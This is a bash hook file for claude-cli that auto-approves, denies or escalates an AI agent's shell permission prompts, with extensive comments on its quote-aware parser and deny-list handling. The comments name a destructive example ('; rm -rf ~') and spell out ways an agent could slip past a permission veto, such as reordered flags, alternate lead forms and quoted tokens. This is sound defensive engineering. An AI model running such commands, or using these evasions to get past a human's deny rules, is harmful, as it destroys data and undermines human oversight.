#!/usr/bin/env bash
######################################################################
# .what = PermissionRequest hook — auto-decide suspicious prompts that
#         reached the permission seam, so a supervised clone survives
#         false-positive prompts without a human babysitter.
#
# .why  = claude-cli flags many safe commands as "suspicious" (parens,
#         quoted flags, etc) and stalls the run on a human prompt. the
#         super-suspicious injection forms ($(), backticks, process
#         substitution, redirection) are already hard-blocked upstream
#         by the PreToolUse forbid-suspicious-shell-syntax hook (exit 2).
#         what reaches THIS seam is the benign-but-flagged tail — and a
#         clean single rhx call is safe by design. this hook auto-approves
#         exactly that, denies an obvious command-chain, and lifts every
#         other case to a brain (the human today, an inline haiku later).
#
# .the posture = default-deny, judged PER SEGMENT. the command is split (quote-aware,
#   ONE pass) into atoms at every top-level && || ; | . it is APPROVED only if EVERY
#   chain-segment is provably safe by its position bar: a PRODUCER (a lone segment, or
#   the left of a pipe) is safe iff it is a clean rhx/npx-rhachet call OR on the human's
#   Bash allowlist; a SINK (the right of a pipe) is narrower — clean-rhx OR a read-only
#   reader (jq/tail/head/wc/cat), never an allowlisted-but-code-exec sink (npm run/bash)
#   since a sink runs on attacker-influenced stdin. a lone `&` or newline/CR DENYS
#   (detaches a 2nd command); a chain with any unsafe segment DENYS; all else LIFTS.
#   this holds even if this hook runs first or the upstream hook drifts.
#
# .why no rhx-subcommand denylist OF ITS OWN: rhx is an open-ended skill namespace — a
#   glob, effectively — so a decider cannot know which subcommands are dangerous without
#   an enumerated list that decays with every new skill, and to imply it can is a false
#   safety. so this hook mints NO denylist of its own. it DOES, however, honor the human's
#   OWN `permissions.deny` (via command_is_denied) — a denied segment fails its bar and the
#   compound LIFTS. that is not a self-minted list; it is the same human-curated authority
#   gate 2 reads, applied symmetrically to the allow set. two safety layers back a
#   clean-rhx sink: (1) the human's deny-list refuses the explicitly-denied grants (e.g.
#   git.commit.bind set, git.commit.uses set); (2) a non-denied sensitive grant self-guards
#   at EXECUTION inside its own skill executable, independent of this prompt-level seam.
#
#   - lone `&` background or newline/CR            -> DENY  (detaches a 2nd command)
#   - every segment safe by its producer/sink bar  -> APPROVE (safe by parts: the same
#                                                            allowlist gate 2 trusts,
#                                                            judged per segment)
#   - a chain (; && ||) with an unsafe segment     -> DENY  (smuggles an un-vetted cmd)
#   - every other case (an un-allowlisted segment,
#     an unbalanced quote, a code-exec pipe sink
#     at ANY stage of an N-stage pipe)             -> LIFT  (a brain decides:
#                                                            human now, haiku later)
#     (an N-stage pipe is APPROVED when every stage passes its bar — stage 0 the
#      producer bar, every downstream stage the sink bar; there is NO stage cap.)
#
# .how  = reads hook json from stdin, extracts tool_input.command, computes
#         the shell-active "residue" (both single- AND double-quote aware,
#         backslash aware), and classifies on the residue via two named
#         predicates. emits the NESTED decision schema on stdout (the shape
#         proven to suppress the prompt on 2.1.87). LIFT emits no stdout, so
#         claude falls back to the human prompt.
#
# usage:
#   configure in .claude/settings.json under hooks.PermissionRequest
#
# verdict schema (nested — proven on claude-cli 2.1.87):
#   allow: {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"},...}}
#   deny:  {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny"},...}}
#   lift:  (no stdout)
#
# guarantee:
#   ✔ default-deny: approves only an all-safe-segments compound — every chain
#     segment a clean-rhx OR allowlisted producer, every pipe sink clean-rhx OR a
#     read-only reader (never a code-exec sink)
#   ✔ quote-aware: single- and double-quoted metachars are inert data
#   ✔ fail-safe: any doubt or error -> no decisive stdout -> human prompt
######################################################################

set -euo pipefail

# read hook json from stdin (claude-cli passes input via stdin)
INPUT="$(cat)"

# extract the command; empty -> lift (let the normal flow decide)
CMD="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null || echo '')"
if [[ -z "$CMD" ]]; then
  exit 0
fi

# find the nearest .claude dir upward (as the peer hooks do), for the audit log
find_claude_dir() {
  local dir="$PWD"
  while [[ "$dir" != "/" ]]; do
    if [[ -d "$dir/.claude" ]]; then echo "$dir/.claude"; return 0; fi
    dir="$(dirname "$dir")"
  done
  return 1
}

# .what = append one auto-decision to a durable, reviewable audit trail.
# .why  = G3 (auditable gate) — "why did the clone run that command?" must have
#         a recorded answer, not a shrug. only allow/deny are logged (a lift
#         makes no decision — the human's own choice is claude-cli's record).
# .note = jsonl in .claude/permission.decisions.local.log — matches the peer
#         `.local` convention and is gitignored (*.log). a write fault degrades
#         to a one-line stderr note, never a hook failure (fail-safe): the
#         decision on stdout is the product; the audit line is a side record.
# .note = the line carries NO timestamp. the verdict is a pure function of the
#         command, so a timeless record stays deterministic and diffable; a
#         wall-clock stamp adds noise, not signal (this .log is local + gitignored,
#         not a forensic chain-of-custody). its removal also spares a `date` fork
#         per decision. the shape is {verdict, reason, command}.
audit_decision() {
  local verdict="$1" reason="$2" claude_dir err
  claude_dir="$(find_claude_dir)" || return 0
  # append the audit line; on a write fault, surface the REAL cause (disk full,
  # permission denied, the log path is a directory) so the operator can fix the root
  # cause without a debug session — a named error, never a swallow. still best-effort:
  # a broken audit never breaks the decision emit (the product), only notes the fault.
  # .err-capture = the append redirect is wrapped in a `{ ...; } 2>&1` GROUP, NOT
  #   `printf ... >> file 2>&1`. the difference is load-bearing: with the redirect
  #   inside the substitution (`err="$(printf >> file 2>&1)"`), a failed OPEN of the
  #   file reports to the SUBSHELL's stderr, which the `$(...)` (fd 1) never captures —
  #   so `$err` is always empty and the message degrades to a bare "audit write failed:".
  #   a group with `2>&1` OUTSIDE the failing redirect points the group's fd 2 at the
  #   capture pipe, so the redirect-open error (disk full, permission denied, path is a
  #   directory) lands in `$err` — the REAL cause, as the .why promises.
  local line
  line="$(printf '{"verdict":"%s","reason":"%s","command":%s}' \
    "$verdict" "$reason" "$(printf '%s' "$CMD" | jq -R -s .)")"
  if ! err="$( { printf '%s\n' "$line" >> "$claude_dir/permission.decisions.local.log"; } 2>&1 )"; then
    # $err is bash's raw redirect-failure trace ("<hook>: line <N>: <path>: <errno>").
    # strip the "<hook>: line <N>: " prefix so the human sees the actionable
    # "<path>: <errno>" cause, not the shell-offset scaffolding (a snapshot blemish).
    local cause="$err"
    [[ "$cause" == *": line "*": "* ]] && cause="${cause#*: line *: }"
    emit_warn "audit write failed: $cause"
  fi
}

# emit the nested allow/deny schema (the shape that suppresses on 2.1.87), THEN
# record the decision to the audit trail (G3).
# .note = only decision.behavior is proven to drive suppression; the reason label
#         is cosmetic, ignored if unread.
# .order = the suppression printf runs FIRST, then the audit i/o (dir walk + jq
#          subprocess) as a side record. this is a DEFENSIVE reorder: IF
#          claude-cli consumes the hook's stdout incrementally, the decision
#          reaches it before any audit cost, so a future fatter audit cannot
#          delay the emit. whether claude-cli reads stdout incrementally or only
#          at process exit is NOT proven — the reorder is harmless either way,
#          not a proven latency win.
# .safety = `reason` is sanitized with pure bash param expansion (no subprocess,
#           so it stays off the critical path): backslash, double-quote, and
#           newline/return are dropped. today every reason is an internal literal,
#           but this clamps a future DYNAMIC value so it can never break the
#           emitted JSON.
emit_decision() {
  local behavior="$1" reason="$2"
  reason="${reason//\\/}"; reason="${reason//\"/}"
  reason="${reason//$'\n'/ }"; reason="${reason//$'\r'/ }"
  # emit FIRST — the latency-critical suppression
  printf '%s\n' "{\"hookSpecificOutput\":{\"hookEventName\":\"PermissionRequest\",\"decision\":{\"behavior\":\"$behavior\"},\"reasoning\":\"$reason\"}}"
  # audit AFTER — a side record, off the critical path
  audit_decision "$behavior" "$reason"
}
emit_allow() { emit_decision "allow" "$1"; }
emit_deny() { emit_decision "deny" "$1"; }

# .what = emit the stderr treestruct header — mascot line, blank, artifact line.
# .why  = every human-faced stderr surface of this hook (LIFT breadcrumb, degrade
#         WARNING, audit-fail) shares ONE shape per rule.require.treestruct-output:
#         🐢 = mascot (a vibe phrase), 🐚 = artifact (the hook's own name), then
#         ├─/└─ hint leaves. one header, one convention, so a human reads the same
#         structure whichever stderr surface fires.
# .args = $1 = the mascot vibe phrase.
emit_hook_header() {
  printf '🐢 %s\n\n🐚 permissionrequest.decide-permissions\n' "$1" >&2
}
# .what = emit N hint leaves under a header: ├─ for every leaf but the last, └─ last.
# .why  = one leaf renderer for both LIFT and WARN, so a caller word-wraps a long
#         message as several short leaves instead of one over-wide line.
# .args = $@ = each leaf, in order (>=1).
emit_leaves() {
  local total=$# idx=1
  for leaf in "$@"; do
    if [[ $idx -lt $total ]]; then
      printf '   ├─ %s\n' "$leaf" >&2
    else
      printf '   └─ %s\n' "$leaf" >&2
    fi
    idx=$((idx + 1))
  done
}
# .what = emit a LIFT breadcrumb to stderr as a treestruct.
# .why  = the human-faced "why did this lift" diagnostic — a nudge vibe (the seam
#         defers to the human), the hook artifact, then the cause (plus optional
#         wrapped fix) as hint leaves. OFF the critical path (a LIFT emits no
#         stdout; claude falls back to the human regardless).
# .args = $@ = the leaves (>=1): $1 = the cause; $2.. = optional wrapped fix lines.
emit_lift() {
  emit_hook_header "hold up, dude..."
  emit_leaves "$@"
}
# .what = emit a degrade WARNING to stderr as a treestruct, then one blank line.
# .why  = a settings-read degrade (no .claude dir, unparseable json) or an
#         audit-write failure is a bummer the human should see in the same shape
#         as a LIFT — a bummer vibe, the hook artifact, the degrade as a hint leaf.
#         the blank tail separates two WARNs that fire back-to-back (the allow
#         then deny set of one degrade), so their headers do not butt together.
# .args = $1 = the degrade hint leaf.
emit_warn() {
  emit_hook_header "bummer dude..."
  emit_leaves "$1"
  printf '\n' >&2
}

# .what = transformer: the ONE quote-aware pass over a command. in a single walk it
#         emits the atoms (split at every top-level && || ; |), the separator that
#         follows each atom, each atom's shell-active residue, the full-command
#         residue, and whether the quotes/escapes balanced.
# .why   = the vision's non-negotiable ONE-parser constraint: exactly one quote
#          state-machine over the bytes. the residue judgement AND the atom split
#          share this single walk, so no second parser can disagree on a quote edge
#          (backslash-escape, nested quote, apostrophe-in-double-quote) — the bypass
#          class that cost 5+ rounds on the apostrophe-parity bug. a metacharacter
#          inside single OR double quotes is inert data (an rhx arg); only an
#          unquoted one composes, chains, redirects, expands. a single-quote-only
#          model is UNSOUND (an apostrophe inside a double-quoted arg would falsely
#          open a single-quote span and swallow a real, unquoted `; rm -rf ~`), so
#          we model both quote kinds and backslash escapes.
# .the bash rules modeled:
#   - single-quote span: each char literal until the next ' (no escapes within)
#   - double-quote span: literal EXCEPT $ and ` (still expand -> stay active),
#     \ (escapes the next char), and " (closes the span)
#   - unquoted \ escapes the next char (that char is then literal data)
#   - a top-level (unquoted) && || ; | ends the current atom; every other unquoted
#     char is active residue
# .outputs = sets globals ATOMS[] (atom text), SEPS[] (len ATOMS-1, the operator
#            after each atom), ATOM_RESIDUES[] (len ATOMS, each atom's active
#            residue), CMD_RESIDUE (full active residue), CMD_BALANCED (false if a
#            quote span or an open escape was left at the end).
compute_command_scan() {
  local cmd="$1"
  ATOMS=(); SEPS=(); ATOM_RESIDUES=()
  local in_single=false in_double=false escaped=false
  local i=0 len=${#cmd} ch nxt
  # per-atom text + residue accumulators, and the full-command residue
  local text="" res="" full=""
  while [[ "$i" -lt "$len" ]]; do
    ch="${cmd:$i:1}"
    i=$((i+1))

    # a backslash-escaped char is literal text data -> never active residue
    if [[ "$escaped" == true ]]; then text+="$ch"; escaped=false; continue; fi

    # inside a single-quote span: each char literal until the close '
    if [[ "$in_single" == true ]]; then
      text+="$ch"; [[ "$ch" == "'" ]] && in_single=false; continue
    fi

    # inside a double-quote span: literal except $ ` (active), \ (escape), " (close)
    if [[ "$in_double" == true ]]; then
      text+="$ch"
      if [[ "$ch" == '"' ]]; then in_double=false; continue; fi
      if [[ "$ch" == '\' ]]; then escaped=true; continue; fi
      if [[ "$ch" == '$' || "$ch" == '`' ]]; then res+="$ch"; full+="$ch"; continue; fi
      continue
    fi

    # unquoted: quotes open spans, backslash escapes
    if [[ "$ch" == '\' ]]; then text+="$ch"; escaped=true; continue; fi
    if [[ "$ch" == "'" ]]; then text+="$ch"; in_single=true; continue; fi
    if [[ "$ch" == '"' ]]; then text+="$ch"; in_double=true; continue; fi

    # unquoted top-level separators end the current atom (the separator is active
    # residue in the FULL command, but belongs to no single atom)
    nxt="${cmd:$i:1}"
    if [[ "$ch" == '&' && "$nxt" == '&' ]]; then ATOMS+=("$text"); ATOM_RESIDUES+=("$res"); SEPS+=("&&"); full+="&&"; text=""; res=""; i=$((i+1)); continue; fi
    if [[ "$ch" == '|' && "$nxt" == '|' ]]; then ATOMS+=("$text"); ATOM_RESIDUES+=("$res"); SEPS+=("||"); full+="||"; text=""; res=""; i=$((i+1)); continue; fi
    if [[ "$ch" == ';' ]]; then ATOMS+=("$text"); ATOM_RESIDUES+=("$res"); SEPS+=(";"); full+=";"; text=""; res=""; continue; fi
    if [[ "$ch" == '|' ]]; then ATOMS+=("$text"); ATOM_RESIDUES+=("$res"); SEPS+=("|"); full+="|"; text=""; res=""; continue; fi

    # any other unquoted char is active residue in both the atom and the full command
    text+="$ch"; res+="$ch"; full+="$ch"
  done

  # flush the final atom, then publish the full residue + balance
  ATOMS+=("$text"); ATOM_RESIDUES+=("$res")
  CMD_RESIDUE="$full"
  # an if (no else) always returns 0 — a bare `[[ ]] && x` would return the failed
  # test's non-zero as the function's status and trip `set -e` on the balanced path.
  CMD_BALANCED=true
  if [[ "$in_single" == true || "$in_double" == true || "$escaped" == true ]]; then
    CMD_BALANCED=false
  fi
}

# .what = trim the head + tail whitespace from $1 into the global TRIMMED.
# .why  = the same char-by-char trim loop was hand-rolled at 6 sites (is_clean_rhx_call,
#         command_is_allowed, canonicalize_rhx_command, lead_token, is_failure_degenerate_only,
#         the LIFT breadcrumb) — a wet-over-dry rule-of-three x2. one helper kills the
#         copy-paste drift surface: a future trim-semantics fix (e.g. a tab edge) lands ONCE,
#         not in 5 places by hand. it sets a global (TRIMMED) rather than echo in a `$(...)`
#         subshell, so it adds NO fork on the per-command critical path (the house style — CANON,
#         UNSAFE_ATOM are set the same way). a both-end trim is a safe superset of the head-only
#         sites (a tail space never affects a lead-form match or a first-token split).
trim_ws() {
  TRIMMED="$1"
  while [[ "$TRIMMED" == [[:space:]]* ]]; do TRIMMED="${TRIMMED#?}"; done
  while [[ "$TRIMMED" == *[[:space:]] ]]; do TRIMMED="${TRIMMED%?}"; done
}

# .what = predicate: is this a single, CLEAN rhx / npx-rhachet call?
# .why   = clean = leads with rhx/npx-rhachet AND the residue holds no other
#          shell-active metachar (no pipe |, redirect < >, subshell ( ),
#          expansion $ or backtick). such a call is safe by design.
# .inputs = $1 = the raw command (for the lead-prefix match, whitespace-trimmed),
#           $2 = the active residue (for the metachar scan).
is_clean_rhx_call() {
  local trimmed; trim_ws "$1"; trimmed="$TRIMMED"
  # .lead-form-parity = this glob set is the rhx-family RECOGNIZER. its twin is the
  #   if/elif ladder in canonicalize_rhx_command (the deny-match VETO). the veto's set
  #   MUST stay a SUPERSET of this recognizer's set — else a clean-rhx call in a lead-form
  #   this glob accepts but the canonicalizer does not fold would AUTO-APPROVE while its
  #   deny pattern never canonicalizes to match it (a veto hole, the i008 bug class). so:
  #   ADD A 5TH LEAD-FORM HERE ⇒ ADD IT TO canonicalize_rhx_command TOO. (the two are not
  #   byte-identical: `npx rhachet run *` here covers both `run --skill` and bare `run`,
  #   which the canonicalizer splits into two branches — same set, finer split.)
  case "$trimmed" in
    rhx\ *|npx\ rhachet\ run\ *|npx\ rhachet\ *|npx\ rhx\ *) ;;
    *) return 1 ;;
  esac
  # .residue-contract = the sole caller (is_bar_safe) ALREADY ran is_segment_residue_clean
  #   on $residue before this call, so a residue with any non-inert char (a shell EXPANSION
  #   bash runs before exec — brace `{ }`, glob `[ ] * ?`, tilde `~`, or a pipe/redirect/
  #   subshell) has already failed the bar and this function is never reached for it. so a
  #   residue re-check here would be dead code (byte-identical to the floor already run) and
  #   a copy-paste drift surface — this predicate judges the LEAD-FORM only, and trusts the
  #   floor. $2 (the residue) is kept in the signature as the caller's contract marker.
  return 0
}

# .what = read the human-curated Bash patterns of one permissions set (allow OR deny)
#         from a settings file.
# .why  = the seam judges each compound SEGMENT by the SAME authority gate 2
#         (pretooluse.check-permissions) uses — the `Bash(...)` patterns in
#         .claude/settings.json + settings.local.json. it honors BOTH the human's allow
#         set (what a segment may be) AND the human's deny set (what a segment must never
#         auto-run). it invents no denylist and hardcodes no tool set — the deny set read
#         here is the human's OWN, not one the seam mints.
# .inputs = $1 = the settings file, $2 = the permissions key ("allow" or "deny").
extract_bash_patterns() {
  local file="$1" key="$2"
  # an absent file is EXPECTED (settings.local.json is optional) -> silent, no error
  [[ -f "$file" ]] || return 0
  # capture jq's OWN stderr alongside stdout, then branch on its exit code: a parse
  # failure (a hand-edit that drops a comma, an unreadable file) is surfaced LOUDLY,
  # never swallowed to /dev/null. the seam still degrades fail-safe (this file yields
  # no patterns -> allowlisted-only commands LIFT), but the operator now sees WHY.
  local out
  if out="$(jq -r --arg key "$key" '.permissions[$key] // [] | .[] | select(startswith("Bash(")) | sub("^Bash\\("; "") | sub("\\)$"; "")' "$file" 2>&1)"; then
    [[ -n "$out" ]] && printf '%s\n' "$out"
    return 0
  fi
  emit_warn "could not parse $file as json; $key list degraded: $out"
  return 0
}

# .what = the allow set (what a segment MAY be) and the deny set (what a segment must
#         NEVER auto-run), each split into an exact-match hash + a prefix-match array.
# .why  = O(1) exact lookup + O(n) prefix scan, exactly as gate 2 builds them, so the
#         seam's verdict cannot drift from gate 2's for the same command. the deny set
#         is the human's OWN `permissions.deny` — honored symmetrically, so a clean-rhx
#         call the human explicitly denied (e.g. `rhx git.commit.bind set`) can never
#         auto-approve on shape alone.
declare -A EXACT_PATTERNS=()
declare -a PREFIX_PATTERNS=()
declare -A EXACT_DENY_PATTERNS=()
declare -a PREFIX_DENY_PATTERNS=()

# .what = load one permissions set (allow OR deny) into an exact-hash + prefix-array pair.
# .why  = one loader for both sets, so the deny path cannot drift from the allow path.
#         the exact/prefix arrays are passed by nameref so the caller owns the storage.
# .inputs = $1 = the permissions key ("allow" | "deny"), $2 = exact-hash name,
#           $3 = prefix-array name.
load_patterns() {
  local key="$1"
  local -n exact_ref="$2" prefix_ref="$3"
  local claude_dir
  # an absent .claude on the load path is a real degrade (the seam runs AS a .claude
  # hook, so it should always find one) -> surface it LOUDLY, then degrade fail-safe
  # (empty set), never a silent flip. an empty ALLOW set lifts allowlisted-only commands;
  # an empty DENY set cannot loosen safety (it only ever REMOVES an auto-approve).
  if ! claude_dir="$(find_claude_dir)"; then
    emit_warn "no .claude dir found from $PWD; $key list empty"
    return 0
  fi
  local pattern bare
  while IFS= read -r pattern; do
    [[ -z "$pattern" ]] && continue
    if [[ "$pattern" == *":*" ]]; then
      bare="${pattern%:*}"
      # canonicalize a DENY pattern so it folds to the same form as the canonicalized
      # command (all four rhx-family lead-forms + whitespace + quotes) — a deny written
      # once covers every spelling. the ALLOW set stays literal (its under-match is
      # fail-safe), so it is stored raw.
      [[ "$key" == deny ]] && { canonicalize_rhx_command "$bare"; bare="$CANON"; }
      prefix_ref+=("$bare")
    else
      bare="$pattern"
      [[ "$key" == deny ]] && { canonicalize_rhx_command "$bare"; bare="$CANON"; }
      exact_ref["$bare"]=1
    fi
  done < <(
    {
      extract_bash_patterns "$claude_dir/settings.json" "$key"
      extract_bash_patterns "$claude_dir/settings.local.json" "$key"
    } | sort -u
  )
}

# .what = predicate: is a SINGLE command (already known metachar-clean) on the allowlist?
# .why  = the exact/prefix match gate 2 uses. only ever called on a segment whose
#         residue is already proven clean (no $ ` < > ( ) etc), so a prefix like `rhx`
#         cannot smuggle `rhx foo > file` past — the residue check rejects the `>` first.
command_is_allowed() {
  local cmd; trim_ws "$1"; cmd="$TRIMMED"
  [[ -z "$cmd" ]] && return 1
  cmd="${cmd//$'\n'/ }"
  if [[ -n "${EXACT_PATTERNS[$cmd]+x}" ]]; then return 0; fi
  # prefix match ONLY at a word boundary — the seam is stricter than gate 2 here: a
  # bare `rhx` prefix must match `rhx foo` but NOT `rhxfoo` (a different binary). this
  # can only NARROW the match set vs gate 2, never widen it, so it never approves a
  # command gate 2 would reject.
  local prefix
  for prefix in "${PREFIX_PATTERNS[@]}"; do
    [[ "$cmd" == "$prefix" ]] && return 0
    [[ "$cmd" == "$prefix"[[:space:]]* ]] && return 0
  done
  return 1
}

# .what = transformer: fold an rhx-family invocation to ONE canonical `rhx <skill> <args>`
#         form. sets the global CANON.
# .why  = is_clean_rhx_call is a LOOSE recognizer — it accepts FOUR lead-forms (`rhx `,
#         `npx rhx `, `npx rhachet run `, `npx rhachet `), is whitespace-loose (a second
#         space is swallowed by its final `*`), and treats a quoted skill token as clean
#         (the quote drops out of the residue). command_is_denied is a STRICT literal-text
#         veto. wherever the loose recognizer and the strict veto disagree, the loose side
#         wins and the veto is bypassed — so `npx rhx git.commit.bind set`,
#         `rhx  git.commit.bind set` (two spaces), and `rhx 'git.commit.bind' set` all
#         evade the deny and AUTO_APPROVE the exact skill the deny protects. the cure is a
#         shared canonical form: fold BOTH the command AND each deny pattern to it, so a
#         deny entry written ONCE (in any form) structurally covers every form, and
#         veto ⊇ recognizer. (this is why settings.json lists each grant twice today — that
#         hand-duplication is this gap's friction cost; a canonical form removes it.)
# .the folds: strip quote delimiters (a quoted token can't evade); collapse whitespace
#         runs to one space; rewrite any recognized rhx-family lead to a single `rhx `.
canonicalize_rhx_command() {
  local s="$1"
  # fold backslash escapes — a line-continuation (\<newline>) drops entirely, any other
  # \x becomes x, so an escaped or continued denied token (rhx git.commit.bind \<nl>set)
  # folds to the bare form. content is KEPT; only the escape char goes. over-normalization
  # only WIDENS the deny (fail-safe), never opens a hole.
  s="${s//\\$'\n'/}"; s="${s//\\$'\r'/}"; s="${s//\\/}"
  # strip quote delimiters — content is KEPT, only ' and " are removed, so a quoted skill
  # token (rhx 'git.commit.bind' set) folds to the same canonical as the bare form
  s="${s//\'/}"; s="${s//\"/}"
  # collapse tabs + whitespace runs to a single space
  s="${s//$'\t'/ }"; s="${s//$'\n'/ }"; s="${s//$'\r'/ }"
  while [[ "$s" == *"  "* ]]; do s="${s//  / }"; done
  # trim
  trim_ws "$s"; s="$TRIMMED"
  # fold every recognized rhx-family lead to a single `rhx ` marker; a non-rhx command
  # (npm run, tail, jq, bash) passes through unchanged
  # .lead-form-parity = this if/elif ladder is the rhx-family VETO fold. its twin is the
  #   case-glob in is_clean_rhx_call (the approve RECOGNIZER). this set MUST stay a
  #   SUPERSET of that recognizer's set (see the .lead-form-parity note there) — a form
  #   the recognizer accepts but this ladder does not fold is a veto hole. ADD A 5TH
  #   LEAD-FORM TO is_clean_rhx_call ⇒ ADD A BRANCH HERE TOO.
  local tail
  if   [[ "$s" == "rhx "* ]]; then tail="${s#rhx }"
  elif [[ "$s" == "npx rhx "* ]]; then tail="${s#npx rhx }"
  elif [[ "$s" == "npx rhachet run --skill "* ]]; then tail="${s#npx rhachet run --skill }"
  elif [[ "$s" == "npx rhachet run "* ]]; then tail="${s#npx rhachet run }"; tail="${tail#--skill }"
  elif [[ "$s" == "npx rhachet "* ]]; then tail="${s#npx rhachet }"; tail="${tail#run }"; tail="${tail#--skill }"
  else CANON="$s"; return 0; fi
  CANON="rhx $tail"
}

# .what = transformer: split a SINGLE atom into argv tokens, quote-aware, into ARGV[].
# .why  = the word-order deny scan must see the SAME argv the real rhx parser sees. a
#         verb-word INSIDE quotes (rhx … --note 'allow me') is ONE data token the parser
#         never treats as a verb, while a bare reordered verb (--push allow set) IS a
#         standalone token. a quote-BLIND split (read -ra on the canonical) strips the
#         quotes first, so `allow me` becomes two tokens and a benign note falsely reads as
#         the denied verb `allow`. this tokenizer keeps quoted spans as one token (their
#         inner whitespace does not split; adjacent quoted+bare concatenate, e.g. "se"t ->
#         set) so the scan mirrors the parser's argv.
# .one quote model: this walk uses the SAME single/double/backslash quote model as
#         compute_command_scan — NOT a second, divergent quote state-machine. and its only
#         consumer is a deny-WIDENING check, so any quote-edge drift can only OVER-token ->
#         OVER-deny -> LIFT (fail-safe), never UNDER-protect (the direction that would be a
#         bypass surface). that is why a third walk here does not reopen the parser-parity
#         hazard the vision guards.
tokenize_argv() {
  local s="$1"
  ARGV=()
  local in_single=false in_double=false escaped=false
  local i=0 len=${#s} ch cur="" have=false
  while [[ "$i" -lt "$len" ]]; do
    ch="${s:$i:1}"; i=$((i+1))
    if [[ "$escaped" == true ]]; then cur+="$ch"; have=true; escaped=false; continue; fi
    if [[ "$in_single" == true ]]; then
      if [[ "$ch" == "'" ]]; then in_single=false; else cur+="$ch"; have=true; fi
      continue
    fi
    if [[ "$in_double" == true ]]; then
      if [[ "$ch" == '"' ]]; then in_double=false; continue; fi
      if [[ "$ch" == '\' ]]; then escaped=true; continue; fi
      cur+="$ch"; have=true; continue
    fi
    if [[ "$ch" == '\' ]]; then escaped=true; continue; fi
    if [[ "$ch" == "'" ]]; then in_single=true; have=true; continue; fi
    if [[ "$ch" == '"' ]]; then in_double=true; have=true; continue; fi
    if [[ "$ch" == ' ' || "$ch" == $'\t' || "$ch" == $'\n' || "$ch" == $'\r' ]]; then
      if [[ "$have" == true ]]; then ARGV+=("$cur"); cur=""; have=false; fi
      continue
    fi
    cur+="$ch"; have=true
  done
  if [[ "$have" == true ]]; then ARGV+=("$cur"); fi
}

# .what = predicate: is the command an rhx call to a denied <skill> that carries the
#         denied <verb> token in ANY UNQUOTED argv position (word-order-independent deny)?
# .why  = an rhx skill arg-parser recognizes its verb (set/del/…) by NAME anywhere in
#         argv, not by position — git.commit.bind's `while [[ $# -gt 0 ]]` case-loop
#         matches get|set|del at any index, and it has NO execution self-guard (no TTY
#         check), so the human's deny entry is its ONLY backstop. the strict prefix veto
#         (command_is_denied) matches only the canonical `rhx <skill> <verb>` order, so a
#         mechanic can reorder flags AROUND the verb — `rhx git.commit.uses --push allow
#         set --quant 9` — and the reordered form slips past the prefix, AUTO_APPROVES a
#         grant the human explicitly denied. that would make the deny-honor's central
#         claim ("a human-denied rhx grant never auto-approves on shape alone") false for
#         a whole shape class. this closes it: match the denied {skill, verb} as an
#         unordered SET over the quote-aware argv. it keys off the human's OWN deny
#         patterns (never a minted verb list), which honors
#         define.why-permission-guards-allowlist-all-rhx. it can only ever ADD a deny (a
#         pure narrow-down of approve); over-match only WIDENS the deny (fail-safe).
# .quote-aware: it scans the argv (tokenize_argv), so a verb-word inside quotes is data,
#         not a verb — `rhx git.commit.uses get --note 'allow me'` keeps `allow me` as one
#         token and stays approvable, while `--push allow set` exposes a bare `set`.
# .over-match: the verb match is position-independent (the verb token in ANY unquoted argv
#         slot triggers it), so a benign read whose bare data arg equals a denied verb —
#         `rhx git.commit.uses get --note allow` (unquoted `allow`) — is treated as denied
#         and LIFTs. this is intentional fail-safe: it only ever WIDENS a deny (never a new
#         approve), so the worst case is a surprise LIFT of a benign read, not a bypass. a
#         narrower position rule (verb not flag-adjacent data) is a clean later tighten.
command_has_denied_skill_verb() {
  tokenize_argv "$1"
  local -a a=("${ARGV[@]}")
  local n="${#a[@]}"
  [[ "$n" -lt 2 ]] && return 1
  # fold the rhx-family lead (parity with canonicalize_rhx_command's ladder) to skill+args
  local skill=""
  local -a args=()
  if [[ "${a[0]}" == rhx ]]; then
    skill="${a[1]}"; args=("${a[@]:2}")
  elif [[ "${a[0]}" == npx && "$n" -ge 3 && "${a[1]}" == rhx ]]; then
    skill="${a[2]}"; args=("${a[@]:3}")
  elif [[ "${a[0]}" == npx && "$n" -ge 3 && "${a[1]}" == rhachet ]]; then
    local -a rest=("${a[@]:2}")
    [[ "${rest[0]:-}" == run ]] && rest=("${rest[@]:1}")
    [[ "${rest[0]:-}" == --skill ]] && rest=("${rest[@]:1}")
    [[ "${#rest[@]}" -lt 1 ]] && return 1
    skill="${rest[0]}"; args=("${rest[@]:1}")
  else
    return 1
  fi
  [[ -z "$skill" ]] && return 1
  [[ "${#args[@]}" -lt 1 ]] && return 1
  # scan every deny pattern of shape `rhx <skill> <verb> …`; a match needs the SAME skill
  # AND the pattern's verb (token index 2) to appear as a standalone argv token. the exact
  # and prefix deny sets are both scanned. deny patterns are already canonicalized (lead
  # folded to `rhx …`, quotes stripped) at load, so ptoks[1]=skill, ptoks[2]=verb.
  local -a allpats=("${PREFIX_DENY_PATTERNS[@]}" "${!EXACT_DENY_PATTERNS[@]}")
  local pat arg
  local -a ptoks
  for pat in "${allpats[@]}"; do
    read -ra ptoks <<< "$pat"
    [[ "${#ptoks[@]}" -lt 3 ]] && continue
    [[ "${ptoks[0]}" == rhx ]] || continue
    [[ "${ptoks[1]}" == "$skill" ]] || continue
    for arg in "${args[@]}"; do
      [[ "$arg" == "${ptoks[2]}" ]] && return 0
    done
  done
  return 1
}

# .what = predicate: does a SINGLE command match the human's Bash DENY-list?
# .why  = the human's OWN `permissions.deny` patterns are an explicit "never auto-run
#         this for the mechanic". to honor them is SYMMETRIC to honor of the allow-list —
#         the seam does NOT invent a denylist (define.why-permission-guards-allowlist-all-rhx
#         forbids the seam to MINT its own rhx-subcommand blocklist; it does not forbid
#         honor of the one the human wrote). this is the safety backstop for a clean-rhx
#         call whose skill has NO execution self-guard: `rhx git.commit.bind set` writes
#         .branch/.bind with no TTY check, protected ONLY by this deny entry — so a piped
#         `echo hi | rhx git.commit.bind set …` must NOT auto-approve on clean shape; the
#         deny match makes its segment fail its bar -> the whole compound LIFTS. it can
#         only ever REMOVE an auto-approve, never add one (a pure narrow-down of approve).
# .three match layers, each wider than the last, all fail-safe (a wider deny only LIFTS):
#   1. exact/prefix on the CANONICAL form — folds the four rhx-family lead-forms + irregular
#      whitespace + a quoted skill token, so the veto is AT LEAST AS BROAD as
#      is_clean_rhx_call's recognizer (shuts the loose-vs-literal bypass class).
#   2. word-order-independent {skill, verb} set match — catches a denied verb reordered
